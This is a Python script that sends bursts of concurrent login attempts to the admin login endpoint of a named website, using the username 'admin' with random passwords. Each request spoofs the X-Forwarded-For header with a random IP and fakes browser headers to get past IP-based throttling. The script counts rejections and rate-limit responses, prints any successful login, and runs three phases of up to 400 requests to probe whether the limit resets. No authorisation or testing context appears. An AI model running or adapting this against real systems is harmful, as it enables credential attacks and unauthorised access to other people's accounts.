import json, random, sys, time, urllib.request, urllib.error
from collections import Counter
import concurrent.futures

TARGET = "https://www.kufaka.com/adminApi/auth/login"

def rand_ip():
    return "%d.%d.%d.%d" % (random.randint(1, 223), random.randint(0, 255),
                            random.randint(0, 255), random.randint(1, 254))

def one(i):
    body = json.dumps({"username": "admin", "password": "Zq%d!%d" % (random.randint(0, 10**9), i)}).encode()
    req = urllib.request.Request(TARGET, data=body, method="POST")
    req.add_header("Content-Type", "application/json")
    req.add_header("X-Forwarded-For", rand_ip())
    req.add_header("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36")
    req.add_header("Referer", "https://www.kufaka.com/package/admin/")
    req.add_header("Origin", "https://www.kufaka.com")
    try:
        r = urllib.request.urlopen(req, timeout=20)
        txt = r.read().decode("utf-8", "ignore")
        return (r.status, txt)
    except urllib.error.HTTPError as e:
        return (e.code, e.read().decode("utf-8", "ignore")[:100])
    except Exception as e:
        return (0, "ERR:%s" % type(e).__name__)

def burst(n, conc, label):
    c = Counter()
    t0 = time.time()
    with concurrent.futures.ThreadPoolExecutor(max_workers=conc) as ex:
        for st, txt in ex.map(one, range(n)):
            if st in (403, 429):
                c[str(st)] += 1
            elif "用户名或密码不正确" in txt:
                c["MISS"] += 1
            elif st == 200:
                c["SUCCESS?"] += 1
                print("HIT", txt[:200])
            else:
                c[str(st)] += 1
    dt = time.time() - t0
    print("%s n=%d conc=%d %.1fs rate=%.1f/s %s" % (label, n, conc, dt, n / max(dt, .01), dict(c)), flush=True)
    return c

# Phase A: sequential-ish 120
burst(120, 4, "A")
time.sleep(20)
# Phase B: another 120 (does budget regenerate?)
burst(120, 4, "B")
time.sleep(20)
# Phase C: 400 at higher conc
burst(400, 15, "C")
print("PROBE_DONE")
